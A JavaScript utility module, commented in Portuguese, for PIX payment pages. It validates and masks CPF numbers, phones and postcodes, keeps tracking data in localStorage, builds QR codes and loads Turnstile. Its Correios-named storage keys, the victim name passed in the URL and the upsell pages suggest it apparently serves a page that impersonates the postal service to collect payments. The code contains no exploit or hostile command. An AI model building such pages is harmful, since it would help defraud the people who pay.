/**
 * ========================================
 * PixCommon — Funções compartilhadas entre módulos de pagamento PIX
 *
 * Carregue ANTES dos scripts de página (pagamento.js, up1.js, etc.)
 * Expõe window.PixCommon com utilities, localStorage helpers e UI helpers.
 * ========================================
 */
(function() {
    'use strict';

    const GENERIC_NAMES = [
        'prezado destinatario', 'prezado destinatário', 'destinatario', 'destinatário',
        'cpf localizado', 'cpf encontrado', 'titular', 'usuario', 'usuário', 'cliente', '---',
        'prezado destinat', 'prezado', 'destinat'
    ];

    const SRC_STORAGE_KEY = 'correios_src';
    const TRACKING_STORAGE_KEY = 'correios_tracking';
    const LEGACY_TRACKING_STORAGE_KEY = 'google_tracking';
    const TURNSTILE_SITE_KEY = '0x4AAAAAACuJv-mGSKw0BcJc';

    // ========================================
    // TIER 1: Pure utilities (stateless)
    // ========================================

    function getQueryParam(param) {
        return new URLSearchParams(window.location.search).get(param);
    }

    function decodeName(name) {
        if (!name) return '';
        try {
            let decoded = name;
            while (decoded.includes('%')) {
                const next = decodeURIComponent(decoded);
                if (next === decoded) break;
                decoded = next;
            }
            return decoded.trim();
        } catch (_) {
            return String(name).trim();
        }
    }

    function normalizePhone(value) {
        var digits = String(value || '').replace(/\D/g, '');
        if (digits.length > 11 && digits.startsWith('55')) {
            digits = digits.slice(2);
        }
        if (digits.length > 11 && digits.charAt(0) === '0') {
            digits = digits.replace(/^0+/, '');
        }
        return digits.slice(0, 11);
    }

    function normalizeCpf(value) {
        return String(value || '').replace(/\D/g, '');
    }

    function isValidEmail(email) {
        return /^[^\s@]+@[^\s@]+\.[a-zA-Z]{2,}$/.test(String(email || '').trim());
    }

    function isValidPhone(phone) {
        const d = normalizePhone(phone);
        return d.length === 10 || d.length === 11;
    }

    function isGenericName(name) {
        const n = decodeName(name).toLowerCase();
        if (!n || n.length < 4) return true;
        return GENERIC_NAMES.some(function(g) { return n.includes(g); });
    }

    function validarCPF(cpf) {
        const v = normalizeCpf(cpf);
        if (v.length !== 11) return false;
        if (/^(\d)\1{10}$/.test(v)) return false;
        let s = 0, r;
        for (let i = 0; i < 9; i++) s += parseInt(v.charAt(i), 10) * (10 - i);
        r = (s * 10) % 11;
        if (r >= 10) r = 0;
        if (r !== parseInt(v.charAt(9), 10)) return false;
        s = 0;
        for (let i = 0; i < 10; i++) s += parseInt(v.charAt(i), 10) * (11 - i);
        r = (s * 10) % 11;
        if (r >= 10) r = 0;
        return r === parseInt(v.charAt(10), 10);
    }

    function maskCpf(value) {
        const d = normalizeCpf(value).slice(0, 11);
        if (d.length <= 3) return d;
        if (d.length <= 6) return d.replace(/(\d{3})(\d+)/, '$1.$2');
        if (d.length <= 9) return d.replace(/(\d{3})(\d{3})(\d+)/, '$1.$2.$3');
        return d.replace(/(\d{3})(\d{3})(\d{3})(\d+)/, '$1.$2.$3-$4');
    }

    function maskPhone(value) {
        const d = normalizePhone(value).slice(0, 11);
        if (d.length <= 2) return d;
        if (d.length <= 6) return d.replace(/(\d{2})(\d+)/, '($1) $2');
        if (d.length <= 10) return d.replace(/(\d{2})(\d{4})(\d+)/, '($1) $2-$3');
        return d.replace(/(\d{2})(\d{5})(\d+)/, '($1) $2-$3');
    }

    function maskCep(value) {
        const d = String(value || '').replace(/\D/g, '').slice(0, 8);
        if (d.length <= 5) return d;
        return d.replace(/(\d{5})(\d+)/, '$1-$2');
    }

    // ========================================
    // TIER 2: localStorage / session
    // ========================================

    function getSrc() {
        const src = localStorage.getItem(SRC_STORAGE_KEY) || getQueryParam('src') || '';
        return src === 'ERR' ? '' : src;
    }

    function getGoogleTracking() {
        function readStore(key) {
            try { return JSON.parse(localStorage.getItem(key) || '{}'); }
            catch (_) { return {}; }
        }
        var atual = readStore(TRACKING_STORAGE_KEY);
        var legacy = readStore(LEGACY_TRACKING_STORAGE_KEY);
        return {
            gclid: atual.gclid || legacy.gclid || '',
            gbraid: atual.gbraid || legacy.gbraid || '',
            wbraid: atual.wbraid || legacy.wbraid || ''
        };
    }

    function handleSrcChange() {
        var srcUrl = getQueryParam('src');
        if (srcUrl && srcUrl !== 'ERR') {
            var srcAnterior = localStorage.getItem(SRC_STORAGE_KEY);
            if (srcAnterior && srcAnterior !== srcUrl) {
                localStorage.removeItem(TRACKING_STORAGE_KEY);
                localStorage.removeItem(LEGACY_TRACKING_STORAGE_KEY);
            }
            localStorage.setItem(SRC_STORAGE_KEY, srcUrl);
        }
    }

    function getSessionData(storageKey) {
        try {
            const data = localStorage.getItem(storageKey);
            if (!data) return null;
            return JSON.parse(data);
        } catch (_) {
            return null;
        }
    }

    function generateSessionHash(identifier, suffix) {
        const data = identifier + '_' + (suffix ? suffix + '_' : '') + new Date().toDateString();
        let hash = 0;
        for (let i = 0; i < data.length; i++) {
            const c = data.charCodeAt(i);
            hash = ((hash << 5) - hash) + c;
            hash = hash & hash;
        }
        return Math.abs(hash).toString(36);
    }

    // ========================================
    // TIER 3: UI helpers
    // ========================================

    function gerarQRCodeLocal(texto) {
        try {
            if (typeof qrcode === 'undefined') return null;
            const qr = qrcode(0, 'M');
            qr.addData(texto);
            qr.make();
            return qr.createDataURL(8, 0);
        } catch (_) {
            return null;
        }
    }

    function exibirNomeHeader() {
        const nomeUrl = getQueryParam('nome');
        const nomeLocal = localStorage.getItem('correios_nome');
        const nome = nomeUrl || nomeLocal;

        if (nomeUrl && !nomeLocal && !isGenericName(nomeUrl)) {
            localStorage.setItem('correios_nome', nomeUrl);
        }

        const decoded = decodeName(nome);
        if (!decoded) return;

        const normalized = decoded.toUpperCase().trim();
        const invalidos = ['CPF LOCALIZADO', 'CPF ENCONTRADO', 'TITULAR', 'USUARIO',
            'USUÁRIO', 'CLIENTE', 'PREZADO', 'DESTINATÁRIO', 'DESTINATARIO', '---'];
        if (invalidos.some(function(inv) { return normalized.includes(inv); })) return;

        const headerNav = document.getElementById('headerNav');
        const userNameEl = document.querySelector('.btn-entrar .user-name');
        if (!headerNav || !userNameEl) return;

        const partes = decoded.trim().split(/\s+/).map(function(p) {
            return p.charAt(0).toUpperCase() + p.slice(1).toLowerCase();
        });

        userNameEl.textContent = partes.length >= 2 ? partes[0] + ' ' + partes[1] : partes[0];
        headerNav.classList.add('has-user-name');
    }

    // ========================================
    // TIER 4: Turnstile helpers (retry for async script load)
    // ========================================

    function waitForTurnstile(callback, maxWait) {
        if (typeof turnstile !== 'undefined') {
            callback();
            return;
        }
        var waited = 0;
        var interval = 200;
        var timer = setInterval(function() {
            waited += interval;
            if (typeof turnstile !== 'undefined') {
                clearInterval(timer);
                callback();
            } else if (waited >= (maxWait || 5000)) {
                clearInterval(timer);
            }
        }, interval);
    }

    // ========================================
    // PUBLIC API
    // ========================================

    window.PixCommon = {
        getQueryParam: getQueryParam,
        decodeName: decodeName,
        normalizePhone: normalizePhone,
        normalizeCpf: normalizeCpf,
        isValidEmail: isValidEmail,
        isValidPhone: isValidPhone,
        isGenericName: isGenericName,
        validarCPF: validarCPF,
        maskCpf: maskCpf,
        maskPhone: maskPhone,
        maskCep: maskCep,
        getSrc: getSrc,
        getGoogleTracking: getGoogleTracking,
        handleSrcChange: handleSrcChange,
        getSessionData: getSessionData,
        generateSessionHash: generateSessionHash,
        gerarQRCodeLocal: gerarQRCodeLocal,
        exibirNomeHeader: exibirNomeHeader,
        waitForTurnstile: waitForTurnstile,
        TURNSTILE_SITE_KEY: TURNSTILE_SITE_KEY
    };
})();
